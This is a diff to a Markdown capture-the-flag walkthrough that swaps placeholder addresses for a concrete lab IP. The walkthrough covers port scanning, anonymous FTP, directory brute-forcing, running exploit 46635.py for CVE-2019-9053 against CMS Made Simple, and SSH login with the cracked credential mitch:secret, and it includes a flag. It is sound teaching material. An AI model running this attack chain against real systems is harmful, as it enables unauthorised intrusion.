@@ -38,7 +38,7 @@ to attack. Never scan default ports only — non-standard ports like 2222 are
 deliberately used to avoid basic scanners.
 
 ```bash
-nmap -sV -sC -p- --min-rate 5000 10.10.x.x
+nmap -sV -sC -p- --min-rate 5000 10.49.167.200
 ```
 
 **Flag breakdown:**
@@ -52,7 +52,7 @@ nmap -sV -sC -p- --min-rate 5000 10.10.x.x
 
 **Output:**
 ```
-kali@kali:~$ nmap -sV -sC -p- --min-rate 5000 10.10.x.x
+kali@kali:~$ nmap -sV -sC -p- --min-rate 5000 10.49.167.200
 
 PORT     STATE SERVICE VERSION
 21/tcp   open  ftp     vsftpd 3.0.3
@@ -83,10 +83,10 @@ basic scanners that only check common ports.
 Log in and retrieve any files.
 
 ```bash
-kali@kali:~$ ftp 10.10.x.x
-Connected to 10.10.x.x.
+kali@kali:~$ ftp 10.49.167.200
+Connected to 10.49.167.200.
 220 (vsFTPd 3.0.3)
-Name (10.10.x.x:kali): anonymous
+Name (10.49.167.200:kali): anonymous
 Password:
 230 Login successful.
 ```
@@ -131,7 +131,7 @@ find — the developer's name leaking through a carelessly named file.
 what application is running.
 
 ```bash
-kali@kali:~$ curl http://10.10.x.x/robots.txt
+kali@kali:~$ curl http://10.49.167.200/robots.txt
 ```
 
 **Output:**
@@ -154,7 +154,7 @@ find what is actually there.
 
 ```bash
 kali@kali:~$ gobuster dir \
--u http://10.10.x.x \
+-u http://10.49.167.200 \
 -w /usr/share/wordlists/dirb/common.txt \
 -x php,txt
 ```
@@ -170,7 +170,7 @@ Gobuster v3.1.0
 ===============================================================
 ```
 
-Navigate to `http://10.10.x.x/simple/` — this loads **CMS Made Simple**.
+Navigate to `http://10.49.167.200/simple/` — this loads **CMS Made Simple**.
 Scroll to the bottom of the page to find the version in the footer:
 **CMS Made Simple Version 2.2.8**
 
@@ -199,7 +199,7 @@ kali@kali:~$ searchsploit -m php/webapps/46635.py
 **Run the exploit:**
 ```bash
 kali@kali:~$ python2 46635.py \
--u http://10.10.x.x/simple/ \
+-u http://10.49.167.200/simple/ \
 --crack \
 -w /usr/share/wordlists/rockyou.txt
 ```
@@ -229,12 +229,12 @@ The CVE number is **CVE-2019-9053** and the vulnerability type is
 SSH is on non-standard port 2222 — remember to specify it.
 
 ```bash
-kali@kali:~$ ssh -p 2222 mitch@10.10.x.x
+kali@kali:~$ ssh -p 2222 mitch@10.49.167.200
 ```
 
 **Output:**
 ```
-mitch@10.10.x.x's password: secret
+mitch@10.49.167.200's password: secret
 
 Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
 
@@ -373,22 +373,22 @@ Syslog
 ## Full Attack Chain Reference
 
 ```
-1.  nmap -sV -sC -p- --min-rate 5000 <IP>
+1.  nmap -sV -sC -p- --min-rate 5000 10.49.167.200
     → FTP(21), HTTP(80), SSH(2222)
 
-2.  ftp <IP>
+2.  ftp 10.49.167.200
     → Anonymous login → ForMitch.txt → username: mitch
 
-3.  gobuster dir -u http://<IP> -w common.txt
+3.  gobuster dir -u http://10.49.167.200 -w common.txt
     → /simple/ → CMS Made Simple 2.2.8
 
 4.  searchsploit cms made simple 2.2
     → CVE-2019-9053 → 46635.py
 
-5.  python2 46635.py -u http://<IP>/simple/ --crack -w rockyou.txt
+5.  python2 46635.py -u http://10.49.167.200/simple/ --crack -w rockyou.txt
     → mitch:secret
 
-6.  ssh -p 2222 mitch@<IP>
+6.  ssh -p 2222 mitch@10.49.167.200
     → user.txt: G00d j0b, keep up!
 
 7.  sudo -l
